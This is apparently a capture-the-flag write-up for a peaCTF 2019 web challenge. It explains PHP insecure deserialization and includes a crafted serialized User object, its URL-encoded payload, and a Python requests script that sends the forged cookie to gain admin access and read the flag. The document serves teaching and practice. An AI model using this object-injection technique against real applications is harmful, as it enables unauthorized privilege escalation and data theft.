The web exploitation challenge named "Educated Guess" had the following description:

> There is a secured system running at http://shell1.2019.peactf.com:59525/query.php. You have obtained the source code.

The source is:

```php
<!doctype html>
<html>
<head>
    <title>Secured System</title>
</head>
<body>
<?php

// https://www.php-fig.org/psr/psr-4/

function autoload($class)
{
    include $class . '.class.php';
}

spl_autoload_register('autoload');

if (!empty($_COOKIE['user'])) {
    $user = unserialize($_COOKIE['user']);

    if ($user->is_admin()) {
        echo file_get_contents('../flag');
    } else {
        http_response_code(403);
        echo "Permission Denied";
    }
} else {
    echo "Not logged in.";
}
?>
</body>
</html>
```

Here we have an autoload of the php classes but we don't know which ones, then we have a check for existance of the **user** cookie, if it exists the code unserialize it and check the **is_admin()** method on it.

Whenever we see an unserialization in php the first thing to try is object injection, but this technique allows us just to rewrite the variables, not the methods of a class. The name of the challenge and the hint
> Good programmers follow naming conventions.

suggest to guess something and to work with programming conventions. The first thing to discover is the name of the class used to create the user token, this can be guessed starting from the autoload function **$class . '.class.php'** and pretending that the class is called **User**, this hypothesis can be verified browsing http://shell1.2019.peactf.com:59525/User.class.php which will result in a blank page instead of the **Not found** page, so now we are sure about the name of the class, move on.

Now we need to guess what the method **is_admin** does, following OOP conventions we use **is** prefix whenever we want to create a getter method for a boolean attribute and this prefix is followed with the full name of the attribute, if we are following the full OOP convention then we need to set the attribute as private. The PHP class resulting from these guesssing and research is the following:

```php
class User{
    private $admin = true;
}
```

Then of course we need to instantiate an object of this class and serialize it.

```php
$user = new User();
echo urlencode(serialize($user));
```

The resulting string is:
> O%3A4%3A%22User%22%3A1%3A%7Bs%3A11%3A%22%00User%00admin%22%3Bb%3A1%3B%7D

Now we only need to send the string as a cookie to the challenge page. I'll use python requests library.
```python
import requests

r = requests.get('http://shell1.2019.peactf.com:59525/query.php', cookies = {
    'user' : 'O%3A4%3A%22User%22%3A1%3A%7Bs%3A11%3A%22%00User%00admin%22%3Bb%3A1%3B%7D'
})

print(r.text)
```

Running the script we will have:

```html
<!doctype html>
<html>
<head>
    <title>Secured System</title>
</head>
<body>
flag{peactf_follow_conventions_52344aae6e9a73578f6425f93aaae681}</body>
</html>
```
